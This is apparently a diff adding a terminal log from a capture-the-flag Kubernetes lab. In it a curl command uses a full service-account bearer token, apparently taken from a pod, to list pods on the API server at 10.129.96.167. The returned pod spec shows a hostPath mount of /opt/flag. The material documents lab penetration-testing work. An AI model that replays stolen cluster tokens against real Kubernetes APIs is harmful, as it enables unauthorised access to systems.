@@ -1,0 +1,205 @@
+### [2026-04-05 10:56:23] curl -k -H Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Ik5scHZ2eDdQNFlhOXhDNXVXRVdYTUExbUprYUFKcjB6dEJWYTBPSkZaNTgifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxODA2ODkxNzAwLCJpYXQiOjE3NzUzNTU3MDAsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6IjAyMWU1YTc5LTc1NmMtNGMwMS1iNjEyLTdkMWNjNGViZDI0YiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6ImVjYTdmNGM2LWZmNWItNDE4NC1hMTE0LTk3MzIxNmM3OTQ2MCJ9LCJ3YXJuYWZ0ZXIiOjE3NzUzNTkzMDd9LCJuYmYiOjE3NzUzNTU3MDAsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.LBjsaohknTIRqQ9MVhTItgPciDLJ1b8p0Sm5GgWDLq126sFmGeErSnYIHxDSzDlpA5giC4F3en-Txa0ZWKNpJkPWQcrl6qsuIZ4oKJF6LtONoUlH8Osr3ni8V28ooRvRLgxM1-tGM5WvEIKyrZHlZy2RsuYLXFyd5XPtW9ZX4DpO7wUVJluYQBYInVpmuhdqR4uNT0pNkaEL_Tqyb12KMUqdXa1zzBo_dJ4LVYRmgWOasppBIIz8ICr6t1vYFVHLQTkaFX7kVE9wD91E1Zd-dreWktbFiNKYc-acY79X9fkRnQ-HnID4g7SKmtJyjsYF1pcVzpf-dL-SKfaPUkasEA https://10.129.96.167:8443/api/v1/namespaces/default/pods
+
+$ curl -k -H Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Ik5scHZ2eDdQNFlhOXhDNXVXRVdYTUExbUprYUFKcjB6dEJWYTBPSkZaNTgifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxODA2ODkxNzAwLCJpYXQiOjE3NzUzNTU3MDAsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6IjAyMWU1YTc5LTc1NmMtNGMwMS1iNjEyLTdkMWNjNGViZDI0YiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6ImVjYTdmNGM2LWZmNWItNDE4NC1hMTE0LTk3MzIxNmM3OTQ2MCJ9LCJ3YXJuYWZ0ZXIiOjE3NzUzNTkzMDd9LCJuYmYiOjE3NzUzNTU3MDAsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.LBjsaohknTIRqQ9MVhTItgPciDLJ1b8p0Sm5GgWDLq126sFmGeErSnYIHxDSzDlpA5giC4F3en-Txa0ZWKNpJkPWQcrl6qsuIZ4oKJF6LtONoUlH8Osr3ni8V28ooRvRLgxM1-tGM5WvEIKyrZHlZy2RsuYLXFyd5XPtW9ZX4DpO7wUVJluYQBYInVpmuhdqR4uNT0pNkaEL_Tqyb12KMUqdXa1zzBo_dJ4LVYRmgWOasppBIIz8ICr6t1vYFVHLQTkaFX7kVE9wD91E1Zd-dreWktbFiNKYc-acY79X9fkRnQ-HnID4g7SKmtJyjsYF1pcVzpf-dL-SKfaPUkasEA https://10.129.96.167:8443/api/v1/namespaces/default/pods
+
+  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
+                                 Dload  Upload  Total   Spent   Left   Speed
+  0      0   0      0   0      0      0      0                              0{
+  "kind": "PodList",
+  "apiVersion": "v1",
+  "metadata": {
+    "resourceVersion": "36480"
+  },
+  "items": [
+    {
+      "metadata": {
+        "name": "nginx",
+        "namespace": "default",
+        "uid": "021e5a79-756c-4c01-b612-7d1cc4ebd24b",
+        "resourceVersion": "493",
+        "creationTimestamp": "2026-04-04T12:37:02Z",
+        "annotations": {
+          "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{},\"name\":\"nginx\",\"namespace\":\"default\"},\"spec\":{\"containers\":[{\"image\":\"nginx:1.14.2\",\"imagePullPolicy\":\"Never\",\"name\":\"nginx\",\"volumeMounts\":[{\"mountPath\":\"/root\",\"name\":\"flag\"}]}],\"volumes\":[{\"hostPath\":{\"path\":\"/opt/flag\"},\"name\":\"flag\"}]}}\n"
+        },
+        "managedFields": [
+          {
+            "manager": "kubectl-client-side-apply",
+            "operation": "Update",
+            "apiVersion": "v1",
+            "time": "2026-04-04T12:37:02Z",
+            "fieldsType": "FieldsV1",
+            "fieldsV1": {"f:metadata":{"f:annotations":{".":{},"f:kubectl.kubernetes.io/last-applied-configuration":{}}},"f:spec":{"f:containers":{"k:{\"name\":\"nginx\"}":{".":{},"f:image":{},"f:imagePullPolicy":{},"f:name":{},"f:resources":{},"f:terminationMessagePath":{},"f:terminationMessagePolicy":{},"f:volumeMounts":{".":{},"k:{\"mountPath\":\"/root\"}":{".":{},"f:mountPath":{},"f:name":{}}}}},"f:dnsPolicy":{},"f:enableServiceLinks":{},"f:restartPolicy":{},"f:schedulerName":{},"f:securityContext":{},"f:terminationGracePeriodSeconds":{},"f:volumes":{".":{},"k:{\"name\":\"flag\"}":{".":{},"f:hostPath":{".":{},"f:path":{},"f:type":{}},"f:name":{}}}}}
+          },
+          {
+            "manager": "kubelet",
+            "operation": "Update",
+            "apiVersion": "v1",
+            "time": "2026-04-04T12:37:03Z",
+            "fieldsType": "FieldsV1",
+            "fieldsV1": {"f:status":{"f:conditions":{"k:{\"type\":\"ContainersReady\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:status":{},"f:type":{}},"k:{\"type\":\"Initialized\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:status":{},"f:type":{}},"k:{\"type\":\"Ready\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:status":{},"f:type":{}}},"f:containerStatuses":{},"f:hostIP":{},"f:phase":{},"f:podIP":{},"f:podIPs":{".":{},"k:{\"ip\":\"172.17.0.3\"}":{".":{},"f:ip":{}}},"f:startTime":{}}},
+            "subresource": "status"
+          }
+        ]
+      },
+      "spec": {
+        "volumes": [
+          {
+            "name": "flag",
+            "hostPath": {
+              "path": "/opt/flag",
+              "type": ""
+            }
+          },
+          {
+            "name": "kube-api-access-zl8lc",
+            "projected": {
+              "sources": [
+                {
+                  "serviceAccountToken": {
+                    "expirationSeconds": 3607,
+                    "path": "token"
+                  }
+                },
+                {
+                  "configMap": {
+                    "name": "kube-root-ca.crt",
+                    "items": [
+                      {
+                        "key": "ca.crt",
+                        "path": "ca.crt"
+                      }
+                    ]
+                  }
+                },
+                {
+                  "downwardAPI": {
+                    "items": [
+                      {
+                        "path": "namespace",
+                        "fieldRef": {
+                          "apiVersion": "v1",
+                          "fieldPath": "metadata.namespace"
+                        }
+                      }
+                    ]
+                  }
+                }
+              ],
+              "defaultMode": 420
+            }
+          }
+        ],
+        "containers": [
+          {
+            "name": "nginx",
+            "image": "nginx:1.14.2",
+            "resources": {
+              
+            },
+            "volumeMounts": [
+              {
+                "name": "flag",
+                "mountPath": "/root"
+     100   7023   0   7023   0      0 135.1k      0                              0100   7023   0   7023   0      0 135.0k      0                              0100   7023   0   7023   0      0 134.9k      0                              0
+         },
+              {
+                "name": "kube-api-access-zl8lc",
+                "readOnly": true,
+                "mountPath": "/var/run/secrets/kubernetes.io/serviceaccount"
+              }
+            ],
+            "terminationMessagePath": "/dev/termination-log",
+            "terminationMessagePolicy": "File",
+            "imagePullPolicy": "Never"
+          }
+        ],
+        "restartPolicy": "Always",
+        "terminationGracePeriodSeconds": 30,
+        "dnsPolicy": "ClusterFirst",
+        "serviceAccountName": "default",
+        "serviceAccount": "default",
+        "nodeName": "steamcloud",
+        "securityContext": {
+          
+        },
+        "schedulerName": "default-scheduler",
+        "tolerations": [
+          {
+            "key": "node.kubernetes.io/not-ready",
+            "operator": "Exists",
+            "effect": "NoExecute",
+            "tolerationSeconds": 300
+          },
+          {
+            "key": "node.kubernetes.io/unreachable",
+            "operator": "Exists",
+            "effect": "NoExecute",
+            "tolerationSeconds": 300
+          }
+        ],
+        "priority": 0,
+        "enableServiceLinks": true,
+        "preemptionPolicy": "PreemptLowerPriority"
+      },
+      "status": {
+        "phase": "Running",
+        "conditions": [
+          {
+            "type": "Initialized",
+            "status": "True",
+            "lastProbeTime": null,
+            "lastTransitionTime": "2026-04-04T12:37:02Z"
+          },
+          {
+            "type": "Ready",
+            "status": "True",
+            "lastProbeTime": null,
+            "lastTransitionTime": "2026-04-04T12:37:03Z"
+          },
+          {
+            "type": "ContainersReady",
+            "status": "True",
+            "lastProbeTime": null,
+            "lastTransitionTime": "2026-04-04T12:37:03Z"
+          },
+          {
+            "type": "PodScheduled",
+            "status": "True",
+            "lastProbeTime": null,
+            "lastTransitionTime": "2026-04-04T12:37:02Z"
+          }
+        ],
+        "hostIP": "10.129.96.167",
+        "podIP": "172.17.0.3",
+        "podIPs": [
+          {
+            "ip": "172.17.0.3"
+          }
+        ],
+        "startTime": "2026-04-04T12:37:02Z",
+        "containerStatuses": [
+          {
+            "name": "nginx",
+            "state": {
+              "running": {
+                "startedAt": "2026-04-04T12:37:03Z"
+              }
+            },
+            "lastState": {
+              
+            },
+            "ready": true,
+            "restartCount": 0,
+            "image": "nginx:1.14.2",
+            "imageID": "docker-pullable://nginx@sha256:f7988fb6c02e0ce69257d9bd9cf37ae20a60f1df7563c3a2a6abe24160306b8d",
+            "containerID": "docker://ecc407b18703a7c6210be741df95e55ba3b13eb39bf144e6a9850ee73af2d518",
+            "started": true
+          }
+        ],
+        "qosClass": "BestEffort"
+      }
+    }
+  ]
+}
+# Exit code: 0
+# Duration: 2026-04-05 10:56:23
